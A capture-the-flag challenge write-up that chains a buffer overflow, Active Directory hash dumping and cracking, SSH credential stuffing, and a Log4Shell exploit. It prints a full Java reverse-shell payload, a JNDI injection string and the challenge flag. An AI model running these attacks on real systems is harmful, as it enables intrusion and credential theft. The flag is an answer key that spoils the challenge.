# A Little Bit of Everything

## Authors

- Jarrod Cameron

## Category

- Misc

## Description

Just a simple buffer overflow. How hard can it be?

`nc uptoyou.ctf.secso.cc 5000`

and

`nc uptoyou.ctf.secso.cc 5001`

The flag is in the format `SKYLIGHT{...}`

## Difficulty

- Child's Play

## Points

300

## Files

- objdump.txt: Contains output of `objdump -d path/to/binary`

## Solution

<details>
<summary>Spoiler</summary>

### Idea

1. Exploit binary leveraging buffer overflow
2. Download and open zip file
3. Extract hashes
4. Crack hashes
5. Credential stuffing SSH interface
6. Reuse creds to authenticate to internal web service
7. Identifying the vulnerability
8. Exploiting Log4shell

### Walkthrough

#### 1. Binary Exploit

Looking at objdump we can see a few things:
- It's 32 bits
- There are not stack canaries
- `gets()` is called
- This is not a PIE binary (i.e. the functions are always the same location
  in memory)

Using the following script we overwrite the return address to jump to the
`win` function.

```bash
ip="$1"
port="$2"
cmd="$3"

{
        /bin/echo -e '\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08\xa6\x91\x04\x08'
        echo "$cmd"
} | nc -v "$ip" "$port"
```

This is not the best script I've written but it gets the job done.

Using this script:

```
$ bash hak.sh 127.0.0.1 5555 'ls -l /ctf'
Connection to 127.0.0.1 5555 port [tcp/*] succeeded!
Please enter your name
!ello
total 16
-rw-r----- 1 root step4   62 Jul 12 14:04 flag.txt
drwxr-xr-x 1 root root  4096 Jul 12 19:51 step1
drwxr-x--- 1 root step2 4096 Jul 12 19:51 step2
drwxr-x--- 1 root step3 4096 Jul 12 19:52 step3
```

Well that was easy!

#### 2. Downloading Zip File

After looking around we can tell that we are very limited in our access, but
we can view the contents of `/ctf/step2/':

```bash
$ bash step1.sh 127.0.0.1 5555 'ls -l /ctf/step2'
Connection to 127.0.0.1 5555 port [tcp/*] succeeded!
Please enter your name
!ello
total 15684
-rw-r----- 1 root step2 16054502 Jul  7 01:01 NTDS.zip
-rw-r----- 1 root step2      216 Jul 11 05:29 README.md
```
`

We can download the NTDS.zip file:

```
$ bash step1.sh 127.0.0.1 5555 'base64 /ctf/step2/NTDS.zip' > NTDS.zip64
Connection to 127.0.0.1 5555 port [tcp/*] succeeded!
^C


# Remove the first few lines
$ vim NTDS.zip64

$ base64 -d NTDS.zip64 > NTDS.zip
$ unzip NTDS.zip
Archive:  NTDS.zip
   creating: skylightNTDS/Active Directory/
  inflating: skylightNTDS/Active Directory/ntds.dit
  inflating: skylightNTDS/Active Directory/ntds.jfm
   creating: skylightNTDS/registry/
  inflating: skylightNTDS/registry/SECURITY
  inflating: skylightNTDS/registry/SYSTEM
```

#### 3. Extracting the Hashes

These files contain information about the "sky.com" domain. For example,
the `NTDS.dit` will contain user information such as "which user belongs to
what group" and "when did this user create their account"?

Interestingly the hashes for the user's passwords can be extracted:

```
~/skylightNTDS# git clone https://github.com/SecureAuthCorp/impacket.git
Cloning into 'impacket'...
remote: Enumerating objects: 21919, done.
remote: Counting objects: 100% (74/74), done.
remote: Compressing objects: 100% (65/65), done.
remote: Total 21919 (delta 36), reused 25 (delta 9), pack-reused 21845
Receiving objects: 100% (21919/21919), 7.71 MiB | 7.13 MiB/s, done.
Resolving deltas: 100% (16737/16737), done.

~/skylightNTDS# cd impacket

~/skylightNTDS/impacket# python3 setup.py install
...
snip
...

~/skylightNTDS/impacket# python3 examples/secretsdump.py \
        -ntds '../Active Directory/ntds.dit' \
        -system ../registry/SYSTEM \
        -outputfile hashes.txt \
        LOCAL
```

The last command will dump the hashes of the users passwords to the file
"hashes.txt.ntds".

#### 4. Cracking the Hashes

Most of the information isn't very important and won't help us. What we are
looking for are the user's hashes we can be found in "hashes.txt.ntds".

Firstly, we should get a password list. We will pass this list to our cracking
tool to attempt to crack the hashes. A common password list is the
_rockyou.txt_ list:

```bash
wget 'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt'
```

Using our wordlist, we can use `hashcat` to crack the hashes:

```bash
hashcat -a 0 hashes.txt.ntds rockyou.txt --output cracked.txt --username --show
```

#### 5. Credential stuffing SSH interface

We have our list of possible passwords and need to see which one lets us
connect to the SSH interface. Ideally our cracked passwords should be in a
`:`-separated list, however the list is a little messy:

```bash
$ cat cracked.txt
sky.com\YVETTE_HINES:07828c36297d3e0080fa3dfaa440f543:debbie
sky.com\ROBT_NGUYEN:78825e3e38514100c230fc211c6b2f43:aurelia
sky.com\NELL_ALEXANDER:61942efc55cda100301a7e7779b9f656:RICHARD
sky.com\6783547731SA:807e92324852a700bc4a7305980ab85a:corona1
...
```

To clean up the credentials we can use the following on liner:

```bash
$ awk -F: '{print $1 ":" $3}' cracked.txt | sed 's/^sky\.com\\//g' > creds.txt

$ cat creds.txt
YVETTE_HINES:debbie
ROBT_NGUYEN:aurelia
NELL_ALEXANDER:RICHARD
6783547731SA:corona1
...
```

Using `hydra` we can brute force the SSH interface:

```bash
$ hydra -t 4 -C creds.txt ssh://127.0.0.1:5556
...
[5556][ssh] host: 127.0.0.1   login: PERRY_MENDEZ   password: soccer15
...
```

From the above output we can see the username is `PERRY_MENDEZ` and the
password is `soccer15`.

#### 6. Reuse creds to authenticate to internal web service

We can ssh into the machine with the following command:

```bash
# Password is "soccer15"
ssh -p 5556 PERRY_MENDEZ@127.0.0.1
```

After some looking around for what to do next we can see there is a web
service running locally on port 8080:

```
$ netstat -lant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:8005          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:8009            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:5556            0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.2:5556         172.17.0.1:38368        ESTABLISHED
tcp6       0      0 :::5556                 :::*                    LISTEN

$ curl -i http://127.0.0.1:8080
HTTP/1.1 302 Found
...
```

Using the following command we can view the internal web service from our
browser:

```
ssh -v -N -L 8080:localhost:8080 -p 5556 PERRY_MENDEZ@127.0.0.1

# Then navigate to http://localhost:8080 on your browser
```

We can retry the credentials `PERRY_MENDEX/soccer15` and we are logged in!

#### 7. Identifying the vulnerability

Once we are logged we are presented with a prompt to log a line. But what does
this mean? How does this help us?

Inside of `/ctf/step3` there is a file called `source.zip`. Looking inside the
zip file we can see some `.jsp` files. `.jsp` files are templates that are
served to the user when a web request is performed. From looking at the HTML
in the `.jsp` files and the website presented to us in our browser, it looks
like this is the source code for the application!

The `source` directory also contains a `pom.xml` file. `pom.xml` is used to
tell maven (Java's package manager) what packages and which version to
download. NOTE: This is like "pip" and "requirements.txt" in python-land.

There are two packages of interest in the `pom.xml` file:

```xml
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>

        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.1</version>
        </dependency>
```

Without being a Java expert, it looks obvious that this application is using
Log4j version 2.14.1. This is an outdated package vulnerable to Log4Shell
(CVE-2021-44228), allowing an attacker to gain remote code execution.

Inside of `success.jsp` (the page we are redirected to when we log in) we can
see the following code corresponding to our prompt from the previous step:

```html
<form action="logme.jsp" method="post">
        Insert Line to Log<input type="text" name="line" value="" />
        <input type="submit">
</form>
```

And inside of `logme.jsp`:

```java
String line = request.getParameter("line");

Configurator.setRootLevel(Level.ALL);

Logger logger = LogManager.getLogger("HelloWorld");
logger.info(line);
```

The above code will take our line and send it straight to the logger. Since we
control the input, can can exploit the Log4shell vulnerability.

#### 8. Exploiting Log4shell

A high level explanation of how to exploit Log4shell:

1. Attacker sends payload to victim (e.g. `${jdni:ldap://$IP:$PORT/}`) which
   will get logged (e.g. via `logger.info(line)`)

2. Victim sends LDAP request to LDAP server (controlled by the attacker). LDAP
   server returns a reference to the attacker controlled HTTP server.

3. Attacker returns a compiled Java file to be executed on the victim.

Firstly, let's setup the LDAP server. This should be on your local machine and
then finally copied to the victim's machine. Creating the LDAP server can be
done with:

```bash
git clone 'https://github.com/mbechler/marshalsec'
cd marshalsec
mvn clean package -DskipTests
```

This will create LDAP server called `marshalsec-0.0.3-SNAPSHOT-all.jar`.

Next, let's create the compiled Java program:

```java
// Log4j compatibility
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

// For the revshell
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit implements ObjectFactory {

	// Source: https://www.revshells.com/
	static {
		String host = "127.0.0.1";
		int port = 8888;
		String[] cmd = {"/bin/bash"};
		try {
			Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
			Socket s = new Socket(host, port);
			InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
			OutputStream po = p.getOutputStream(), so = s.getOutputStream();
			while (!s.isClosed()) {
				while (pi.available() > 0)
					so.write(pi.read());
				while (pe.available() > 0)
					so.write(pe.read());
				while (si.available() > 0)
					po.write(si.read());
				so.flush();
				po.flush();
				Thread.sleep(50);
				try {
					p.exitValue();
					break;
				} catch (Exception e) {}
			}
			p.destroy();
			s.close();
		}
		catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws
	Exception {
		return new Exploit();
	}
}
```

This can be compiled using `javac Exploit.java`.

To exploit this vulnerability copy `Exploit.class` and
`marshalsec-0.0.3-SNAPSHOT-all.jar` onto the victim's server in the same
directory. To run the LDAP server:

```bash
java \
    -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
    marshalsec.jndi.LDAPRefServer \
    'http://127.0.0.1:8000/#Exploit' 1389
```

This will listen for LDAP requests on port `1389` and reference our class file
on `http://127.0.0.1:8000/#Exploit`.

To create a HTTP server, simply run `python3 -m http.server`.

Our exploit should create a reverse shell to port 8888 on `localhost`, so
find another terminal and run `nc -lvnp 8888`.

Now that the infrastructure is in place, deploy the payload in the web
application: `${jndi:ldap://127.0.0.1:1389/Exploit}`. We should get a reverse
shell as the `tomcat` user which can be used to read the flag!

```
PERRY_MENDEZ@f1e0a75d7a0d:/$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48872
whoami
tomcat
id
uid=1481(tomcat) gid=1481(tomcat) groups=1481(tomcat),1000(step1),1001(step2),1002(step3),1003(step4)
cat /ctf/flag.txt
SKYLIGHT{Ev3RY_HaXor_n33ds_2_KN0w_A_L1TTl3_b1T_0F_3vEr|tHLNg}
```

### Flag

```
SKYLIGHT{Ev3RY_HaXor_n33ds_2_KN0w_A_L1TTl3_b1T_0F_3vEr|tHLNg}
```

</details>

